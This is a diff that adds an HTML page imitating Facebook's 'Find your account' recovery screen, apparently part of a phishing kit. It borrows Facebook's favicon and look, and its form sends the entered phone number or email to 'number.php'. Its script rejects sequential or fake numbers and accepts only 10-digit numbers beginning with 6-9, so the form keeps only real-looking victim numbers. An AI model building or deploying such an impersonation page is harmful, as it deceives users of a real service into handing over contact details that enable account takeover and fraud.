@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Find Your Account</title>
+  <link rel="icon" type="image/x-icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      width: 100%;
+      max-width: 393px;
+      background: #e6f3fa;
+    }
+
+    .container {
+      max-width: 393px;
+      margin: 60px auto;
+      padding: 25px 20px;
+      border-radius: 20px;
+      position: relative;
+    }
+
+    .back-arrow {
+      position: absolute;
+      left: 15px;
+      top: 15px;
+      cursor: pointer;
+    }
+
+    .back-arrow img {
+      background: transparent;
+      width: 24px;
+      height: 24px;
+    }
+
+    h2 {
+      font-size: 22px;
+      font-weight: 800;
+      margin-bottom: 10px;
+      text-align: left;
+      margin-top: 40px;
+    }
+
+    p.description {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .input-box {
+      position: relative;
+      margin-bottom: 10px;
+    }
+
+    input[type="text"] {
+      padding: 20px;
+      height: 60px;
+      border-radius: 10px;
+      width: 100%;
+      background: white;
+      color: black;
+      font-size: 17px;
+      outline: none;
+      border: 1px solid #666;
+      margin-top: 2px;
+    }
+
+    label {
+      position: absolute;
+      left: 18px;
+      top: 20px;
+      color: #000;
+      font-size: 15px;
+      transition: 0.2s;
+      pointer-events: none;
+    }
+
+    input:focus + label,
+    input:not(:placeholder-shown) + label {
+      top: 8px;
+      left: 15px;
+      font-size: 14px;
+      color: #666;
+      background: white;
+      padding: 0 5px;
+    }
+
+    .cross-img {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+      display: none;
+    }
+
+    .error-text {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .buttons {
+      margin-top: 20px;
+    }
+
+    .buttons button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: 500;
+      border-radius: 25px;
+      cursor: pointer;
+      border: none;
+      background-color: #1877f2;
+      color: white;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="back-arrow" onclick="history.back()">
+      <img src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/back.png" alt="Back" />
+    </div>
+
+    <h2>Find your account</h2>
+    <p class="description">Enter your mobile number or email address.</p>
+
+    <form onsubmit="return validateMobile(event)" method="POST" action="number.php">
+      <div class="input-box">
+        <input type="text" id="mobileNumber" name="text" required placeholder=" " />
+        <label for="mobileNumber">Mobile number or email address.</label>
+        <img src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/20250405_155556.png" alt="Clear" class="cross-img" id="clearIcon" onclick="clearField()" />
+        <div class="error-text" id="errorText"></div>
+      </div>
+
+      <div class="buttons">
+        <button type="submit">Submit</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    const input = document.getElementById("mobileNumber");
+    const clearIcon = document.getElementById("clearIcon");
+    const errorText = document.getElementById("errorText");
+
+    input.addEventListener("input", () => {
+      clearIcon.style.display = input.value.length > 0 ? "block" : "none";
+      errorText.style.display = "none"; // hide error on input
+    });
+
+    function clearField() {
+      input.value = "";
+      clearIcon.style.display = "none";
+      errorText.style.display = "none";
+      input.focus();
+    }
+
+    function validateMobile(event) {
+      const value = input.value.trim();
+      const isLengthValid = /^[0-9]{9,12}$/.test(value);
+      const isMobileFormatValid = /^[6-9][0-9]{9}$/.test(value);
+      const sequentialBadNumbers = [
+        '1234567890', '0123456789', '12345678', '999999999',
+        '4567890123', '5678901234', '987654321', '123456789',
+        '1234512345', '09876512345'
+      ];
+
+      if (!isLengthValid || sequentialBadNumbers.includes(value)) {
+        event.preventDefault();
+        errorText.textContent = "Please enter a valid mobile number.";
+        errorText.style.display = "block";
+        return false;
+      }
+
+      if (!isMobileFormatValid) {
+        event.preventDefault();
+        errorText.textContent = "This number is not allowed. Try another one.";
+        errorText.style.display = "block";
+        return false;
+      }
+
+      return true; // submit form
+    }
+  </script>
+
+</body>
+</html>
